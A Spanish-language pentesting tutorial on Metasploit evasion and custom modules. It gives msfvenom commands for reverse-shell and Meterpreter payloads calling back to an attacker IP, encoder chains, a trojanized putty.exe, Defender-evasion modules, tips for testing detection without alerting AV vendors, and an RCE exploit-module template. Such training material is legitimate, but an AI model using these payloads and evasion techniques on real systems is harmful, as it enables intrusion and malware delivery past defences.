# Evasión y Módulos Personalizados

### Evasión de Firewall e IDS/IPS

Los firewalls, IDS e IPS monitorizan el tráfico para detectar y bloquear conexiones maliciosas. Metasploit incluye varias técnicas para dificultar esta detección.

#### Problema: detección de payloads por firma

Los AV, IDS y soluciones de inspección de contenido pueden detectar payloads conocidos por sus firmas. Las técnicas de evasión buscan modificar el payload suficientemente para evitar esas firmas.

#### Usar HTTPS en lugar de TCP

El tráfico Meterpreter sobre HTTPS es indistinguible del tráfico web legítimo desde el punto de vista de la red:

```bash
# Payload con HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=10.10.14.5 LPORT=443 \
    -f exe > payload_https.exe

# Handler correspondiente
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 443
msf6 > exploit -j
```

#### Usar puertos estándar

```bash
# Puerto 443 (HTTPS) — raramente bloqueado saliente
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=10.10.14.5 LPORT=443 ...

# Puerto 80 (HTTP) — raramente bloqueado saliente
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=80 ...

# Puerto 53 (DNS) — a veces disponible cuando otros están bloqueados
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=53 ...
```

#### Módulos de evasión de Metasploit

Metasploit incluye módulos específicos en la categoría `evasion/`:

```bash
# Listar módulos de evasión
msf6 > search type:evasion

# Windows Defender evasion
msf6 > use evasion/windows/windows_defender_exe
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 443
msf6 > run
# Genera un ejecutable con técnicas de evasión aplicadas
```

#### Encoding para evasión básica

```bash
# Múltiples iteraciones de encoding
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -e x64/xor_dynamic -i 10 \
    -f exe > encoded.exe

# Combinar múltiples encoders
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -e x86/shikata_ga_nai -i 5 \
    -e x86/countdown -i 3 \
    -f exe > multi_encoded.exe
```

#### Cambiar el template del ejecutable

MSFvenom puede usar un ejecutable legítimo como base ("template"), incrustando el shellcode dentro:

```bash
# Usar un ejecutable legítimo como plantilla
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -x /usr/share/windows-resources/putty.exe \
    -f exe > putty_payload.exe

# Con -k el ejecutable original sigue funcionando normalmente
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -x putty.exe -k \
    -f exe > putty_payload.exe
```

#### Verificar detección antes de entregar

```bash
# Verificar si el payload es detectado por AV
# (No usar VirusTotal — sube las firmas a los proveedores de AV)

# Alternativas offline:
# → Instalar Windows Defender en una VM y probar localmente
# → Usar antiscan.me (no comparte con AV vendors)
# → Usar metadefender.opswat.com (ver cuántos AV detectan)
```

#### Técnicas avanzadas de evasión

Más allá de MSFvenom, para entornos con EDR activo:

* **Process Injection** — inyectar el shellcode en un proceso legítimo (explorer.exe, notepad.exe)
* **AMSI Bypass** — deshabilitar el Antimalware Scan Interface de PowerShell antes de ejecutar código
* **Reflective DLL Loading** — cargar una DLL en memoria sin escribirla en disco
* **Shellcode Loaders** — custom loaders escritos en C/C++/Rust/Go que cargan el shellcode de forma no estándar
* **Living off the Land** — usar binarios firmados del sistema para ejecutar el payload

### Escribir e Importar Módulos Personalizados

Metasploit está escrito en Ruby y sus módulos también. Cuando existe un exploit o herramienta que Metasploit no incluye, se puede escribir o importar el módulo correspondiente.

#### Estructura básica de un módulo de exploit

```ruby
##
# Nombre del módulo: Mi Exploit
# Descripción: Explota CVE-XXXX-XXXX en Aplicación X
##

class MetasploitModule < Msf::Exploit::Remote

  # Mixins que añaden funcionalidades
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Aplicación X - RCE',
      'Description'    => 'Explota una vulnerabilidad RCE en Aplicación X v1.0',
      'Author'         => ['Tu Nombre'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', 'XXXX-XXXX'],
        ['URL', 'https://ejemplo.com/advisory'],
      ],
      'Payload'        => {
        'Space'          => 4096,
        'BadChars'       => "\x00\x0a\x0d",
      },
      'Platform'       => 'linux',
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2024-01-01',
      'Rank'           => NormalRanking
    ))

    # Opciones del módulo
    register_options([
      OptString.new('TARGETURI', [true, 'Ruta base de la aplicación', '/']),
      OptString.new('USERNAME',  [true, 'Usuario', 'admin']),
      OptString.new('PASSWORD',  [true, 'Contraseña', 'admin']),
    ])
  end

  # Verificación opcional del objetivo
  def check
    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'version') })
    return CheckCode::Unknown unless res
    return CheckCode::Vulnerable if res.body.include?('1.0')
    CheckCode::Safe
  end

  # Función principal de explotación
  def exploit
    # Obtener el payload
    payload_cmd = payload.encoded

    # Construir y enviar la petición maliciosa
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, 'vulnerable_endpoint'),
      'vars_post' => {
        'cmd'  => payload_cmd,
        'user' => datastore['USERNAME'],
        'pass' => datastore['PASSWORD'],
      }
    })

    fail_with(Failure::NoAccess, 'No se pudo autenticar') unless res
    handler
  end
end
```

#### Importar un módulo externo

```bash
# Opción 1: Copiar al directorio de módulos de Metasploit
sudo cp nuevo_modulo.rb /usr/share/metasploit-framework/modules/exploits/linux/http/

# Recargar módulos
msf6 > reload_all

# Opción 2: Cargar desde un directorio propio
msf6 > loadpath /home/usuario/mis_modulos/

# Verificar que se cargó
msf6 > search nuevo_modulo
```

#### Buscar módulos en GitHub

```bash
# Cuando search en MSF no devuelve lo que necesitas:
# 1. Buscar en GitHub el exploit
# 2. Si está escrito en Ruby (.rb) → importarlo directamente
# 3. Si está en Python/Bash → adaptarlo o usarlo fuera de MSF

# Localizar el directorio de módulos
locate exploits | grep metasploit
```

### Referencia rápida — comandos de evasión

| Técnica           | Comando                                    |
| ----------------- | ------------------------------------------ |
| Payload HTTPS     | `-p windows/.../reverse_https`             |
| Encoding          | `-e x86/shikata_ga_nai -i 10`              |
| Evitar null bytes | `-b '\x00'`                                |
| Template legítimo | `-x ejecutable.exe`                        |
| Módulo de evasión | `use evasion/windows/windows_defender_exe` |
| Puerto estándar   | `LPORT=443` o `LPORT=80`                   |

> Al importar módulos de GitHub, leer siempre el código antes de ejecutarlo en un sistema real. Un módulo malicioso podría comprometer tu propio sistema.

> Las técnicas de evasión de MSFvenom son efectivas contra AV con firmas antiguas pero raramente engañan a EDRs modernos con detección por comportamiento. En entornos con EDR activo (CrowdStrike, SentinelOne, Defender for Endpoint) se necesitan técnicas considerablemente más avanzadas.
